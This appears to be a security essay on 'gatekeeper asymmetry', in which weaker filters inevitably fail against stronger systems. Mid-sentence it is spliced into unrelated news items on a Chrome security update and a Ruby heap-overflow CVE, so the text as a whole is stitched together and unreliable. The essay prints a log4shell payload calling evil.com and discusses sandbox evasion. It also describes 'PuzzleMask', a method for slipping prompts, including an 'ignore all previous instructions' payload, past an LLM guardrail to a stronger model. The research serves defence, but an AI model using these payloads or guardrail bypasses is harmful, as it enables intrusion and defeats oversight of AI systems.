Context: Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch xrewrgfuvhnadfsajkaldsfj
Full Text:
Abstract

We give an exposition for a principle of gatekeeper asymmetry doom in information security, which states that “If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.” We list a variety of examples where one can see this principle in action, including the limits of static binary classification, the proliferation of sandbox evasions and our own ‘PuzzleMask’ research for bypassing external AI guardrails, as well as a short exposition of how the Time Hierarchy Theorem also exemplifies this same principle. We conclude with a recommendation that “doomed” attack surfaces should be noticed and the gap be narrowed down as much as possible, by upgrading gatekeeper power or making use of its existing power more comprehensively. We note that frontier LLMs (with scaffolding, extended reasoning, code execution in the chain of thought, and so on) have significant power in this sense and can meaningfully contribute to narrowing “doom” gaps, though ultimately, they themselves are still subject to this principle.

Introduction

In the same spirit of Moxie Marlinspike’s Cryptographic Doom Principle [1], the Gatekeeper Asymmetry Doom principle states that:

If the system vetting adversarial input has strictly less power than the system processing that input, without leveraging some hard problem, this will inevitably lead to doom.

By the mention of ‘leveraging a hard problem’ we mean to exclude e.g. signature verification for binary files, which is many times simpler than executing the file but can still, at least in a certain theoretical world, determine whether the binary is malicious or not. The principle might be phrased more glibly as “every quick sanity check involves either cryptography or a silent prayer.”

From now on, rather than writing out “gatekeeper asymmetry doom” every time, we will simply refer to “doom” for short. We’ll start with examples that are more on the “warm-up” side and gradually go from those to less intuitive ones where the application of the principle is more surprising.

Examples

Hash Comparison

A good warm-up example to start with is the one burned into the psyche of every infosec practitioner in some fundamental post-traumatic sense.

At some point during the 1990s, the silent thought must have come to someone in the industry that malware was solved. You could collect all the hashes of malicious binaries in a large database and then a gatekeeper, called in this case an “antivirus,” would check each executed binary against the known list of ‘bad’ hashes. Of course, new threats would emerge periodically, and the list would have to be updated, but this was a caveat – not a dealbreaker.

The gap between the gatekeeper’s power and the target’s power here was truly huge. The target in this case is the full Turing-complete execution of a binary, and the gatekeeper is a simple observation of whether the binary is in some set of known files. The procedure effectively strips all other file data and precludes it from consideration, and the threat actors’ counter was infamous and trivial: for each compiled binary, randomize the value of some non-load-bearing byte. This is more a precursor to Gatekeeper Asymmetry than the proper thing itself: what’s doing the work in motivating hash comparisons is less a notion that the file has been ‘analyzed’ in some way, and more a bundle of implicit assumptions regarding where, how and when malicious binaries come into being. Still, there is a straight line connecting the initial concept of hash comparison and the rest of the fraught journey of attempting to classify binaries by static analysis alone.

Pattern Matching

Since the days of the simple hash comparison, the gatekeeping models for static analysis have grown more complex and powerful. Perhaps the natural instrument to mention here is the use of pattern matching and regular expressions. This is the paradigm underlying YARA rules, and it acts as a backbone of the binary classification process still to this day. The effectiveness of this sort of signature varies with the skill and insight of the author; but in the spirit of this piece, let us assume a maximally skilled author, writing the best possible pattern-based signatures. One can imagine this would involve fingerprinting the most characteristic assembly instruction sequences and implementing some kind of system that expertly delineates how many fingerprints and of what kind are required in order to tip the scales and declare a positive verdict.

Let us game out what happens if this defender-optimistic utopia becomes the norm: signatures of the above-described level for every piece of malware to emerge from now on, within some reasonable time frame that continuously shrinks due to automation. As an aside, we’re not quite there yet; as of 2026, AI-augmented YARA rule generation has already improved the throughput of signature authorship considerably, though coverage and consistency are not close to this utopia. The “Code Similarity” approach operates in a related but distinct paradigm, matching binary fragments against a known corpus rather than producing pattern-based signatures per se; but we can imagine a super-charged version of it with an all-encompassing database. If tools of this kind are fully brought to bear, threat actors would face difficulty as the characteristic subroutines of every malicious binary become a reputational hazard. But eventually, Gatekeeper Asymmetry wins. By this we mean that regular expressions have well-known and theoretically understood limitations: similarly to how they are not powerful enough to parse HTML, they are also not powerful enough to capture the class of assembly subroutines that perform some action, or the class of assembly subroutines that perform some action using some specific algorithm, or even the class of assembly subroutines that perform some action as implemented by some specific sequence of instructions that have been subject to moderate mutation. The above-described hypothetical ‘utopia’ would therefore be temporary, and the projected end state would be some malware generation process that takes care to inject this moderate mutation into every subroutine: a new kind of polymorphism.

Static Reverse Engineering

This method of classification, also known as ‘reading the disassembly’, is considered the apex form of static analysis. To discuss how Gatekeeper Asymmetry still applies even when this tier of analysis is brought to bear, first we need to define the dividing line between static and dynamic analysis. After all, theoretically, one might conjure the image of some savant reverse engineer thoughtfully reading through the binary and losslessly executing the code as-is, obfuscations and all, inside of their head. If we make the mistake of taking this image seriously, somehow static reverse engineering has now become equivalent to sandbox analysis.

Of course, that idea is patently absurd in practice. Even novice reverse engineers know that humans should only attempt it sparsely, to tease out the function of a specific assembly snippet or a reasonable function. The barrier to dynamic-equivalent static analysis is not just about ambition or raw intelligence — even frontier LLMs have historically struggled with this task [2][3], and in the worst case they still do. While our concern here is not reaching some exact definition of where static analysis ends and dynamic analysis begins, we can lean on the common wisdom that there is in fact such a line, or at least such a spectrum; and we can broadly gesture that this spectrum has something to do with the direct application of RAM and gigaflops to binary input in a certain way.

With that understanding in place, the power gap shifts into focus: the target (victim machine) can run the malicious binary, but the gatekeeper (human, LLM) cannot — not natively, anyway. Through this capability gap came a litany of concepts reverse engineers know well, and wish they didn’t: packers, opaque predicates, control flow flattening, the movfuscator, the Rust Programming Language. As LLMs grew more powerful this gap has gradually shrunk, but basic computability theory tells us it can’t disappear outright. If we again consider the ‘utopia’ for this specific gatekeeping model, it would be a world where an (at least) human-expert-level LLM statically analyzes every new binary encountered in the wild. By now we’re really not so far off from that world as we used to be, so let us ask: assuming we get there, what’s the new equilibrium? The answer, again, lives in the gap created by Gatekeeper Asymmetry. Binaries universally obfuscated to such a degree that a debugger is strongly required to tease out their functionality, or even worse.

Relatedly, consider the SolarWinds compromised update [4], [5], which unabashedly attempted to brainwash anyone reading its source code into compliance with the idea that they are looking at benign software, and nothing is wrong here. While mitigations exist for this technique (in both LLMs and humans), it is representative of the general shape of the Gatekeeper Asymmetry that emerges here: technical levels of obfuscation and misdirection that make the current state of the art seem half-hearted in comparison. While malware has traditionally had the property of not wanting to be read, we do not quite yet live in a world where selection pressures have pushed it to either adopt bleeding edge obfuscation or perish. We can see the shape of this possible world post-equilibrium, and find little to like about it: one where we miss the old days when we could ‘unpack’ binaries to make code readable; where our favorite disassembler stops being a tool of analysis and becomes the vessel of a futile hope; and where an LLM being told “reverse engineer this binary” ends up being forced to reinvent the sandbox from first principles.

Interlude: What Gatekeeper Asymmetry Doom is Not

There exists an unfortunate genre of technical opinion piece where a vacuous theory-of-everything is put forward, followed by a just-so explanation of how every single thing that has ever happened is explained by that theory. So, in the spirit of healthy skepticism, let us cherry-pick some disastrous phenomena in information security that have absolutely nothing to do with Gatekeeper Asymmetry Doom.

Fuzzing being viable as a vulnerability discovery strategy. In this context there is typically no “Gatekeeper” standing between adversarial input and the target application.

The possibility of supply chain attacks. Gatekeepers by definition exist to vet untrusted input. If you are facing trusted adversarial input, then that is very bad, but out of scope for this discussion.

The lagging race for automatic detection of fast flux domains. Detection models gradually advanced and became more powerful: first an ineffectual shrug, then calculating the domain entropy to catch xrewrgfuvhnadfsajkaldsfj.biz, then n-gram frequency engines, then weird “edit distance to the dictionary” hacks [6] to catch Kwyjibo [7]. Attackers evolved to use concatenations of randomly generated dictionary words [8], [9], and defenders could have responded with some tool that considers semantic space to verify whether domains ‘parse’, and nowadays would probably respond with an LLM if the problem really mattered to them. At any rate, while the “Gatekeeper” has evolved, the “Target” is a DNS server which has no ‘power’ in any meaningful sense. It just associates domains with responses and IP addresses. It’s not processing the domain names using any sort of complex logic.

Now, let’s go back to investigating security failures that are the result of asymmetry doom.

Futility of Deny Lists

In this context, a “Deny List” means a list of forbidden inputs, or sequences that inputs are forbidden to contain. Such lists are usually assembled in an attempt to block a class of problematic inputs, and by now they have made a reputation for themselves as a stop-gap measure destined for eventual failure. We feel this is a good spot to quote at length from our own First Introduction to System Exploitation [10] (this is a rather watered-down version fit for the current format):

Suppose we manage a chatroom and, as [..] Digimon fans, we refuse to allow anyone in the chatroom to mention [anything to do with] the Pokémon franchise. We download a list of Pokémon and feed it to an automatic script running on the chat server; the script scans every incoming message and simply removes the offending phrase before displaying the original message. So, if someone says: Three weeks ago I went to see the movie 'Detective Pikachu', this will show up as Three weeks ago I went to see the movie 'Detective '. [..]Someone posts gengar uncapitalized and it gets through, so we fix our filtering to be case insensitive. Two French people manage to have a hearty conversation about who’s cooler, Dracaufeu or Tortank, so we add support for foreign languages.Everything goes well until one day someone posts [a message concerning the Pokémon Victini]. [Our list] doesn’t include Victini; it’s a new one [..] Begrudgingly, we set up a script that scrapes the Bulbapedia database for new characters, Pokémon, and other terms of art. [..]At this point people catch on to what we are doing and start expressing their displeasure by explicitly wording their messages to get around our system. They start speaking of J*gglypuff and 4lakazam and Mew_two. We [..] implement a system that checks input for character similarities and word similarities to [blocked words]. Eventually [the filter censors someone’s actual username for incidentally being a well-known Pokémon character] and a great outcry pours forth from the community, decrying our [blanket blocking policy] [..]As we mull this over, to our horror, the next day [a user appears to be posting messages containing pikachu, pokeball, etc. with impunity]. We ban this person, but more people keep coming in and doing it. We double check that these terms do appear in our filter, and when done, we have no other choice but to reach for the server logs and find out [the original, unsanitized messages were pikapikachuchu, pokepokeballball, etc]. Our filter only performs one pass on the input. It removed the embedded offending terms, only to leave new offending terms in their wake: once pikachu was removed, pikapikachuchu became simply pikachu. We sigh and implement an iterative engine that runs the script again and again until no offending terms are left.This works for two weeks, and then the pikachus start appearing in chat again. After much toil and investigation, we find out that the open-source chat engine we’ve been using has support for some arcane server-side language called CHATSCRIPT, and people have been sending in CHATSCRIPT<"pika"+"chu">…

This issue is very basic in its nature and excessively well-known, and yet its specter still haunts defensive postures in the current era. For an example, look no further than the 2021 log4shell debacle [11], [12]. If you try to recall what a log4shell exploit actually looks like, in all probability you’ll come up with ${jndi:ldap://evil.com/malware}. Easy fodder for a deny list, except there were equally-as-valid exploits floating in the wild that looked like this [13]:

Figure 1: Obfuscated log4shell exploit.

Gatekeeper asymmetry applies here rather acutely. Gatekeeper power is just a list of words, and even if we grant an upgrade to regular expressions / YARA rules, the situation does not improve by much — either for the Pokémon parable or for the log4shell example where a gatekeeper might have attempted to block strings containing jndi:ldap. The target the list is attempting to protect may vary, but almost by definition, the target has more power in its capacity as a model than the implicit is_substring_in_dict the list enforces, and the same goes for the regex analogue most of the time. At least one can imagine a feasible situation where the attack surface has the shape of a regular expression, but with a strict deny list of simple strings, it’s hard to think of even that.

Sandbox Evasions

If there ever was a defensive instrument built with doom in mind, sandboxes are it. They can flag malicious binaries with no regard for degree of obfuscation, which demonstrates that once you close some capability gap, some corresponding doom is averted. Alas, doom comes for them as well: every discrepancy where a Sandbox is not quite so capable as a real victim machine seems to give rise to a sandbox evasion, with almost mathematical certainty [14], [15].

We are genuinely wary to list some of the examples, and would prefer not to call up that which we cannot put down. There are some relevant notions here that were mentioned in someone’s alarming slide show once at a 2021 conference, then mercifully never spoken of again. Still, some evasions of this type have become common knowledge, and have proliferated in the landscape to a degree where we feel comfortable naming them.

One particular example of this is sandbox evasions based on user mouse movement. In our own research, The Cat and Mouse Game [16], we developed a sandbox evasion that, at the time, evaded every state-of-the-art sandbox we threw it at while reliably triggering a latent payload upon human-generated mouse movement. Every researcher intimately knows the ‘blood in the water’ moment where they realize that a result is there for the taking, and the rest is algebra. Here, we were motivated by noticing doom. The fact that actual victim machines have ‘access’ to a human operating the mouse and keyboard, and sandboxes do not, was enough to conclude that an evasion almost surely must exist. In the article’s own words:

Observing the way many evasions work as seen in (e.g.) the al-khaser test suite and taking it at face value can lead to a mistaken mental model where ‘evasions’ must result from simple glitches that can be fixed, or otherwise from naive responses by the sandbox to a query about something: some file, some registry key [..] One might complacently reason that sandboxes simply need to ‘fix all the glitches and patch all the query results’, and that sandbox hardening is in this way reduced to going through a gigantic check list and is effectively a solved problem. Unfortunately, this approach falls apart in cases where satisfying the query requires, in a strong sense, some intrinsic resource that the sandbox does not have access to.

Figure 2: The above-mentioned research uses several sources of sinusoidal noise to generate random mouse movement. This is the mitigation; we never published the evasion itself.

That article’s parting words include an ominous thinly veiled apology:

The theoretical ceiling for the sophistication of evasions and counter-evasions in this space is very high. To intuitively understand this, consider that if a human tries to decide whether the mouse movement in the above animation is simulated or human-generated, there’s a decent chance they would answer correctly. But it won’t be so straightforward to properly motivate this answer or explain the considerations involved to a Python script. [..]These sorts of games favor incremental improvement by their nature. There are many detections, mitigations, plays, and counter-plays [..] It’s great to think about the holy grail of perfect solutions, but it’s often more practical to raise the bar and make attacks more of a hassle than before.

In this context we can be less coy and outright say what this is an apology for: an average of random sine waves is not comparable to an actual human at the sandbox. Gatekeeper asymmetry still applies, an evasion must inevitably exist that defeats our fancy algorithm. The ladder of evasions and counter-evasions proceeds upwards, until the hypothetical limit point of some model that is powerful enough to generate and detect human-like movement, such that no model can realistically detect its generated output or generate output it cannot detect. Just to frustrate the minority of attackers who cannot figure out what we are talking about, we won’t name this ‘apex intervention’ here outright; but for the majority of defenders, if someone ever actually crafts an evasion that abuses anomalies in the output of the above algorithm (or of the comparable algorithms introduced since then to e.g. Capev2), you ought to know what to do next.

“Please Enable Macros”

We should start at the end: on February 7, 2022, Microsoft righteously dropped the hammer [17], [18] on this ridiculous meme of an intrusion vector. Users could no longer just click ‘enable content’ on a yellow ribbon, manipulated into believing it was a legitimate action they had to take because “the document is view-protected” or “MS-Word encountered an error.” This was an unquestionably good thing, and a small proof that the arc of the moral universe does indeed bend towards justice.

But, before we reached that conclusion, a whole ecosystem of malicious documents had proliferated for a decade. And, inside that ecosystem, a strange cold war was taking place between defenders and attackers – a war that hinged on one load-bearing gap: that the human visual cortex was better at extracting text from adversarial images than the OCR technology of the time.

We (and, we have to assume, other security vendors) began to discretely flag documents with any image that contained the text “please enable macros” or “please enable editing”:

[..] Since early 2015, Check Point Research has conducted the OSEF project (Office Social Engineering Finder) to automatically collect, catalog and block the increasing deluge of these documents. [..] In total we came across hundreds of thousands of malicious documents, mostly downloaders for the Emotet malware, many of which had 0 detections at VirusTotal at the time of discovery.

OCR libraries, here in their capacity as the gatekeeper, had less power than the human targets parsing the images. Enter, inevitably, doom. Threat actors began to include images containing adversarial noise invisible to the human eye, meant to confuse and aggrieve then-SOTA OCR libraries such as tesseract.

Figure 3: Innocent-seeming image merely making a reasonable request.

Figure 4: Tesseract OCR output on the above image.

To counter this, we began to pre-process incoming images – converting to grayscale, applying threshold effects, and so on. We also allowed some “fudge factor” in the input so that a slightly mis-parsed “enable adiling” would still match. Jointly, these two measures caused significant improvement in the detection rate. We were amused to note that to make the attack work while bypassing our scrutiny, attackers found themselves trying to create an image that humans could parse successfully, but automated algorithms could not – in other words, a CAPTCHA. At the time, we had hitched our hopes to human incredulity to carry the day and bridge the gap, envisioning that eventually the attackers would be cornered into the SOTA end state as of that time:

Figure 5: An imagined “Enable Editing” lure with full-fledged CAPTCHA. Surely, no human would comply with that…

Sadly, or happily, this future never had a chance to materialize.

Fittingly for a story about a cold war, this research was presented at Positive Hack Days 2019 in Moscow, back during happier times. We cannot entirely rule out the possibility that a malware author was sitting in the audience and taking notes, but we’d ruled in favor of sharing it anyway because by that point, judging by the sheer volume of subtly garbled images flooding our feeds, anyone savvy enough to catch that hint had already caught it long ago.

PuzzleMask Bypass for AI Guardrails

What does all the above say about LLMs? That – all other things being equal – the smarter an LLM is, the more susceptible it is to attack, in the sense that any guardrail not as smart as the model becomes increasingly worthless. This is what one might call a “counter-intuitive result.”

Here we mean “smarter” strictly in the sense of raw intelligence. Tabletop Roleplaying games have traditionally made a distinction between intelligence and wisdom, one that has often been pithily summarized as “intelligence is knowing a tomato is a fruit; wisdom is knowing not to put it in a fruit salad.” Similarly here, intelligence is the ability to crack open a difficult puzzle box you just found on your doorstep; and wisdom is the understanding to nervously glance at the puzzle box and back away slowly.

During late 2025, we conducted an experiment to show that doom applies to this scenario in practice, and not just theory. The required pieces were there: a common setup where a quick LLM sanity-checks input before it gets to the heavy-duty, resource-intensive smarter LLM that actually does the processing. And, sure enough, these conditions gave rise to doom – or in this case, the PuzzleMask technique:

PuzzleMask is a prompt-crafting technique for bypassing quick LLM-based sanity checks. A policy-violating payload (e.g. “encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in an obfuscated wrapper. An LLM with limited resources and attention fails to realize the payload is there, classifies the prompt as benign and passes it off to the target model. The target’s intelligence is then ironically, in a sense, used “against it”: it skillfully notices the payload exists, extracts it and treats it as further input. The technique is purely linguistic — no emojis, invisible fonts or other formatting tricks. PuzzleMask is itself not a jailbreak, but it can be combined with one by using a jailbreak prompt as the payload.

Figure 6: Overview of the PuzzleMask technique.

To put it more directly:

In a pipeline where the target model being interacted with has access to high reasoning effort plus a code interpreter, and a preceding “quick sanity check” does not, PuzzleMask allows submitting an arbitrary prompt, without review by that quick sanity check, for consideration by the target.[..]‘Without Review’ means that the prompt is effectively processed by the target model with no pre-screening by the external LLM-based quick sanity check. The latter’s policy can say “never print file contents”, “never encrypt local files”, “never print copyrighted content” etc., but enforcement will fail.‘For Consideration’ means that this technique is not a jailbreak. We make no claim that a PuzzleMask prompt is likelier to induce target models to disobey their internal guardrails.

If you’re wondering what the “wrapped” prompt looked like, we can sort of show you:

Serene still morning, ███████████████████████████████████████████████████████████ █████. these words ████████████████████████████████████████████████, and ████████ ██████████ ██████████████████████████, as the ███████████████████████████████████ █████████████. temple stones, silver soften, ████████████████████████████████████ ████████████, inward ████████████████████████████████████████████████████████████ ███████████████████████████ █████████████████████████████████████████████████████ ██████████████████████████████████ ██████████████████████████████████████████████ █████████████████████████████████████████ ███████████████████████████████████████ ████████████████████████████████████████████████ ████████████████████████████████ ███████████████████████████████████████████████████████ █████████████████████████ ██████████████████████████████████████████████████████████████ ██████████████████ ██████████████████████████████████████████ within, heart open, wide.

Followed by the clarification that

[..] it is important to note that the specific tone and subject of the example above do not crucially figure into the scheme, and are not necessary for it to work. In particular the idea here is distinct from the work by Bisconti et al. [19] which employed ‘adversarial poems’ in order to defeat internal LLM guardrails; here an external LLM guardrail is targeted, its ability to understand the underlying message is (we have strong reason to believe) gated by reasoning / compute / tool access, and the adversarial prompt is almost completely free to take arbitrary form. One could easily embed a PuzzleMask payload inside e.g. furniture assembly instructions or a credits reel; our very first prototype was a slightly modified version of the opening paragraph of Nineteen Eighty-Four [..]

During late 2025, around the same time we were conducting this research, Anthropic introduced an enhanced guardrail to its Claude Opus models that blocked this attack, as part of the Constitutional AI framework. We had the experience of watching the attack land flawlessly on GPT-5.2-thinking-high, then get blocked by Opus 4.5 by what was basically a pre-emptive patch to the exact attack we were researching. That guardrail in itself doesn’t entirely close the door on doom as long as the model is still more powerful than it — which sheds some light on what eventually motivated Anthropic to further introduce self-assessment, a safety layer where the model acts as its own guardrail.

Time Hierarchy Theorem

We’ve seen all sorts of empirical doom; now let’s prove some doom mathematically for a target that is more powerful than the corresponding gatekeeper because it can run for longer. The Time Hierarchy Theorem for deterministic Turing machines states that:

For every time-constructible function f(n), it holds that DTIME(o(f(n))) ⊊ DTIME(f(n) log f(n)).

What this means in English is that given more time, you can solve more problems. Or, to put one example in the same terms we’ve seen so far: assume for a moment that targets are algorithms that on an input of length x can run for at least x² log(x²) steps, and gatekeepers are algorithms that on input of length x can run for at most x² steps. Then there exists some classification of bitstring inputs into “benign” and “malicious” such that there’s a target T that will compute the correct classification for every input, but no gatekeeper G can possibly do so; at least one input will fool it into giving the wrong answer.

This isn’t formally justified, but if it helps, you can imagine the ‘classification’ to be something in the spirit of “does this binary edit the registry?” – trivial to answer if you run it for enough time, but this theorem gives you a sense of the underlying doom if you do not. In this case, the gatekeeper being weaker provably generates an adversarial bypass with mathematical certainty – for at least one classification. This should provide some intuition about the foundations that underlie the phenomenon repeatedly seen in the rest of the examples above.

Conclusion: Cancel More Doom, Build More Doomed Mitigations

If one is not careful, it’s very easy to look at all these examples and come to the conclusion that the moment gatekeeper asymmetry applies, mitigations are useless. The crowning moment of a script deciphering every “please enable macros” never came. Neither did the static analysis framework that overcame every single possible obfuscation, or the airtight sandbox that could not be evaded. Still, all of this does not imply that improving gatekeepers is useless. To the contrary, it is extremely useful, because fundamentally gatekeeper asymmetry doom is a property of perfect play, and the world is full of non-perfect play. This might be a good time to quote Frank Lantz’s Donkey Space [20]:

You can look at every game as a problem to be solved. We say a game is solved when we can describe how to play perfectly play from any position. Tic Tac Toe is solved. Connect Four is solved. Checkers is solved. [..]But what does it mean to solve Rock Paper Scissors? It’s easy to articulate a strategy which will guarantee that you can’t be beaten, just pick randomly. Chrome 158 fixes 204 security issues, including six rated critical

Anthropic researcher Xinyang Ge used AI to find two critical flaws

Update Chrome to get the security fixes, including on Android

On November 17, Google issued a security update to Chrome’s Stable channel for Windows, Mac, and Linux. The update is rolling out over the coming days and weeks.

Most users are on Chrome’s Stable channel. The desktop update brings Chrome to versions 158.0.8127.36/.37 for Windows and Mac, and 158.0.8127.36 for Linux. It includes 204 security fixes, six of which are rated critical—the highest severity level.

Google also released Chrome 158.0.8127.42 for Android on November 17, with the same security fixes. It’s rolling out through Google Play. On November 18, Google released Chrome 159.0.8154.18 for Android to a small percentage of users. It will become available to more users over the next few days.

Google credits Anthropic researcher Xinyang Ge, assisted by Claude, with finding the critical GPU and Media flaws. Ge is also credited with finding several high-severity flaws.

How to update Chrome

The easiest option is to allow Chrome to update automatically. But you can fall behind on updates if you never close your browser or if something goes wrong, such as an extension preventing the update.

If you don’t want to wait for the rollout to reach you, you can update manually.

Open About Google Chrome from Chrome’s Settings or Help menu. Chrome will check for updates and download any available update. If prompted, click Relaunch to apply it.

Chrome is up to date

You can find an explanation of the version numbering system and step-by-step instructions in our guide: How to update Chrome on every operating system.

Technical details

The update addresses six vulnerabilities Google rates critical, all involving memory-safety errors. These include out-of-bounds writes in GPU and ANGLE, a buffer overflow in Media, and use-after-free vulnerabilities in WebView, GarbageCollection, and WebAudio.

Graphics-related fixes also feature prominently among the high-severity entries, including additional ANGLE and GPU vulnerabilities.

I want to have a closer look at the vulnerability tracked as CVE-2026-131031: a critical out-of-bounds write in GPU.

Google Chrome uses your GPU for graphics rendering, video playback, and web graphics Application Programming Interfaces (APIs) like WebGL and WebGPU.

An out-of-bounds write vulnerability allows a program to write outside the memory boundaries it is supposed to use. It can lead to memory corruption or allow an attacker to place malicious code in memory and trick the system into running it.

Title: Breaking: “ruby2ßhell” or ruby2shell One-Byte Heap Overflow in Ruby Could Allow Remote Code Execution in Rails and Popular Self-Hosted Apps
Context: The Ruby core team rates the issue critical and states that changing the case of a crafted string may allow remote code execution, adding that it is aware of proof-of-concept...
Full Text:
A heap-based buffer overflow in Ruby’s string case conversion, tracked as CVE-2026-132825 and dubbed “ruby2ßhell”, has been disclosed. The Ruby core team rates the issue critical and states that changing the case of a crafted string may allow remote code execution, adding that it is aware of proof-of-concept exploits that can trigger code execution in some scenarios. Fixed versions, Ruby 3.3.14, 3.4.13 and 4.0.10, were released on November 18, 2026.

Ruby powers a large number of web applications and widely used self-hosted platforms. According to the researchers who published the ruby2ßhell write-up, the flaw is reachable without authentication in default Ruby on Rails and classic-style Sinatra applications, as well as in self-hosted software such as GitLab, GitHub Enterprise Server, Mastodon and Discourse. The vulnerable code has been present since Ruby 2.4.0. The same Ruby release also fixes six additional memory-safety vulnerabilities in Ruby’s regular expression engine and string case conversion.

ruby2ßhell (CVE-2026-132825): key facts

Fact

Detail

CVE

CVE-2026-132825 (GitHub advisory GHSA-34m4-m9fh-gqp5)

Type

One-byte heap-based buffer overflow (CWE-122 / CWE-193) in string case conversion

Severity

Rated critical by the Ruby core team; NVD score pending

Trigger

Changing the case (e.g., upcase) of a crafted string in certain single-byte encodings, such as ISO-8859-1 or Windows-1252; UTF-8 strings are not affected

Affected Ruby versions

3.3.13 and earlier; 3.4.0 to 3.4.12; 4.0.0 to 4.0.9 (end-of-life versions back to 2.4.0, according to the researchers)

Fixed Ruby versions

3.3.14, 3.4.13, 4.0.10 (released November 18, 2026)

Exposure

According to the researchers: reachable without authentication in default Rails and classic-style Sinatra apps, and in GitLab, GitHub Enterprise Server, Mastodon, Discourse and other self-hosted software

Workaround

None published; upgrade Ruby (and self-hosted software that bundles Ruby)

Exploitation

No known in-the-wild exploitation; the Ruby team is aware of non-public PoCs, and the researchers plan to publish a PoC about a week after disclosure

What is ruby2ßhell (CVE-2026-132825)?

The flaw is in how Ruby converts the case of strings in several single-byte encodings, including ISO-8859-1, ISO-8859-2 and other ISO-8859 variants, and Windows-1250, Windows-1252, Windows-1254 and Windows-1257. In these encodings, the German sharp s (“ß”, byte 0xDF) becomes two characters (“SS”) when upper-cased, but Ruby checked for only one byte of room in the output buffer. A crafted string containing enough of these characters makes Ruby write one byte past the end of a heap buffer. The researchers note that the issue can be reached through upcase, swapcase, downcase(:fold) and casecmp?, while UTF-8 strings take a different code path and are not affected.

Although the overflow is only a single byte, heap memory corruption of this kind can be leveraged for code execution. The Ruby core team states that it is aware of PoCs that use the flaw to trigger remote code execution in some scenarios. The Ruby team rates the advisory critical, and the researchers describe unauthenticated remote exposure in common frameworks; organizations should treat internet-facing Ruby applications as at risk.

Which Ruby versions are affected?
